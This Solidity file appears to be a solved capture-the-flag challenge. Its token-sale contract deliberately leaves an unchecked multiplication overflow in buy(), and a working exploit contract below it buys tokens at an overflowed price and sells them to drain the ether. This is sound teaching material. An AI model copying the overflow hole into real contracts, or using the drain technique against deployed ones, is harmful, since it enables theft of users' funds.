// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract TokenSale {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    constructor() payable {
        require(msg.value == 1 ether, "Requires 1 ether to deploy contract");
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable returns (uint256) {
        uint256 total = 0;
        // can overflow with (uint256.max / 1 ether + 1)
        unchecked {
            total += numTokens * PRICE_PER_TOKEN;
        }
        require(msg.value == total, "Not enough ether");

        balanceOf[msg.sender] += numTokens;
        return (total);
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        // reenters, but at this point we've already changed state
        (bool ok,) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
        require(ok, "Transfer to msg.sender failed");
    }
}

// Write your exploit contract below
contract ExploitContract {
    TokenSale public tokenSale;

    event Log(uint256);

    constructor(TokenSale _tokenSale) {
        tokenSale = _tokenSale;
    }

    function attack() public {
        // plan:
        // overflow buy with ((uint256.max / 1 ether) + 1)
        // total will be the overflowed amount (less than 1 ether), but numTokens will be much higher
        // we then empty the contract by selling their balance

        // this will be equal to
        // 1 ether * ((type(uint256).max / 1 ether) + 1)
        // a + 1 ether
        // where a is a little less than type(uint256).max due to division rounding
        // so we'll overflow by a little less than 1 ether
        // QED
        uint256 numTokens = (type(uint256).max / 1 ether) + 1;
        uint256 total = 0;
        unchecked {
            total += numTokens * 1 ether;
        }
        tokenSale.buy{value: total}(numTokens);
        tokenSale.sell(address(tokenSale).balance / 1 ether);
    }

    receive() external payable {}
    // write your exploit functions below
}
